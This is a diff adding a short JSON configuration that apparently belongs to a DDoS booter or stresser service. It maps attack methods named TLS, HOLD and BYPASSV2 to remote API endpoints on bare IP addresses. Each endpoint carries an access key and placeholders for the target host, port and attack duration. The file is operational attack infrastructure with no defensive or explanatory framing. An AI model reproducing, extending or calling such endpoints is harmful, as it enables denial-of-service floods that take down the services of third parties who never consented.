@@ -1,0 +1,25 @@
+{
+
+   "TLS": {
+       "api": [
+        
+"http://2.57.122.129/api.php?key=pidor&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS",
+
+"http://2.57.122.162/api.php?key=pidor&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS"
+       ]
+   },
+    "HOLD": {
+       "api": [
+        
+"http://2.57.122.129/api.php?key=pidor&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GAME"
+       ]
+    },
+   "BYPASSV2": {
+    "api": [
+     
+     "http://65.109.142.51/api.php?key=pidor&host=<<$host>>&port=<<$port>>&time=35&method=TLSV3"
+
+    ]
+}
+ }
+ 
